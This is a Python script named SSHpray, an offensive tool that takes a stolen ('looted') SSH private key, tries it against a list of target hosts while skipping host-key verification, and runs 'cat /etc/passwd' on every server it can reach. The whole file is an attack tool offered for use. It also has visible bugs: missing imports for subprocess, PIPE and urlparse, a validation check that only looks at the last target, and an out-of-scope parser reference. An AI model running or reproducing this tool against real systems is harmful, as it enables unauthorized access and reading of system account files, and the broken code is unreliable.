#!/usr/bin/env python


try:
	import argparse, os, re, signal, socket, sys, time, paramiko
except Exception as e:
	print('\n[!] Import(s) failed! ' +str(e))



class SSHpray():

	def __init__(self, args):

		#defaults
		self.private_keys=[]
		self.args = args
		self.verbose=False
		self.version ='beta.08012017'
		self.startTime=time.time()
		self.reportDir='./reports/'
		self.targetsFile = ''
		self.targetList = []
		self.targetSet=set()
		self.domainResult=set()
		self.userName=None

	def check_args(self):

		print(self.args)

		#require at least one argument
		if not (self.args.targets or self.args.ipaddress):
		    print('\n[!] No scope provided, add a file with IPs with -f or IP address(es) with -i\n')
		    parser.print_help()
		    sys.exit(1)

		#if a file is supplied and no ip is supplied, open it with read_targets
		if self.args.targets is not None:
			print('[i] Opening targets file: %s' % self.args.targets)
			self.targetsFile = self.args.targets
			self.read_targets()
		else:
			self.targetSet = self.args.ipaddress


		if self.args.username is None:
			self.userName = os.getlogin()
		else:
			self.userName = self.args.username

		#self.read_targets()

	def read_targets(self):
		#open targets file
		with open(self.args.targets) as f:
			targets = f.readlines()
			
			#add to target list, strip stuff
			for x in targets:
				self.targetList.append(x.strip())

		#iterate through targetList
		for i,t in enumerate(self.targetList):
			
			#test to see if its a valid ip using socket
			try:
				#print(socket.inet_aton(str(t))) 
				socket.inet_aton(t)
				#add to set
				self.targetSet.add(t)

			#if the ip isnt valid
			except socket.error:
				#tell them
				print ('[!] Invalid IP address [ %s ] found on line %s... Fixing!' %  (t,i+1))
				
				#fix the entries. this function will add resolved IPs to the targetSet
				self.fix_targets(t)

			except Exception as e:
				print(e)

		#finally do a regex on targetList to clean it up(remove non-ip addresses)
		ipAddrRegex=re.compile("\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}")
		
		#only allow IP addresses--if it isnt'
		if not ipAddrRegex.match(t):
			#remove from targetList
			if self.args.verbose is True:print('[v] Removing invalid IP %s'% t)
			self.targetList.remove(t)
		else:
			#otherwise add to target set
			self.targetSet.add(t)

		#need to expand cidr and filter rfc1918, etc	

		#show user target set of unique IPs
		if self.args.verbose is True:print('[i] Reconciled target list:')
		if self.args.verbose is True:print(', '.join(self.targetSet))

		print('[i] All targets are valid IP addresses')

	def fix_targets(self, t):
		
		#function to resolve hostnames in target file or hostnames stripped from URLs to ip addresses.
		#handle full urls:
		if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', t):
			parsed_uri = urlparse(t)
			domain = '{uri.netloc}'.format(uri=parsed_uri)
			if self.args.verbose is True:print('[i] Looking up IP for %s' % domain)
			hostDomainCmd = subprocess.Popen(['dig', '+short', domain], stdout = PIPE)
			#print('[i] IP address for %s found: %s' % (t,hostDomainCmd.stdout.read().strip('\n')))
			#for each line in the host commands output, add to a fixed target list
			self.targetSet.add(hostDomainCmd.stdout.read().strip('\n')) 
		
		#filter hostnames
		else:
			if self.args.verbose is True:print('[i] Looking up IP for hostname %s' % t)
			#just resolve ip from hostname if no http:// or https:// in the entry
			hostNameCmd = subprocess.Popen(['dig', '+short', t], stdout = PIPE)
			self.targetSet.add(hostNameCmd.stdout.read().strip('\n'))

	def signal_handler(self, signal, frame):
		print('You pressed Ctrl+C! Exiting...')
		sys.exit(0)

	def cls(self):
		os.system('cls' if os.name == 'nt' else 'clear')
		print('SSHpray started at: %s' % (time.strftime("%d/%m/%Y - %H:%M:%S")))



	def connect(self):
		signal.signal(signal.SIGINT, self.signal_handler)

		with open(self.args.keyfile) as f:
			private_key = f.readlines()

		print('[i] Using Private Key: %s ' % self.args.keyfile)

		for i, t in enumerate(self.targetSet):

			#command(s) to run
			remote_commands = '''
			cat /etc/passwd;
			exit
			'''

			if self.args.verbose is True: print ("[+] Hitting SSH on %s to run commands" % (t) )

			try:#Initialize SSH session to host via paramiko and run the command contents
				ssh = paramiko.SSHClient()

				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

				ssh.connect(t, username = self.args.username, key_filename = self.args.keyfile, timeout=5)

				stdin, stdout, stderr = ssh.exec_command(str(remote_commands))
				
				#server response not working for some reason
				print ("[+] Server responded with: \n")

				print ('	'.join(stdout.readlines()))

				ssh.close()
				print ('[+] SSH Session to %s closed' % (t))
			except Exception as e:
				print("[!] Exception with host %s: %s" % (t,e))
				pass

			





def main():

	#gather options
	parser = argparse.ArgumentParser()

	parser.add_argument('-i', '--ipaddress', metavar='127.0.0.1', help='single ip to test')
	parser.add_argument('-k', '--keyfile', metavar='<keyfile>', help='private key that you have looted')
	parser.add_argument('-t', '--targets', metavar='<targetfile>', help='list of ssh servers in a file, one per line')
	parser.add_argument('-u', '--username', metavar='<username>', help='username associated with key, default is current local user')
	parser.add_argument('-v', '--verbose', help='Optionally enable verbosity', action = 'store_true')

	args = parser.parse_args()


	run = SSHpray(args)
	run.cls()
	run.check_args()
	run.connect()




if __name__ == '__main__':
    main()
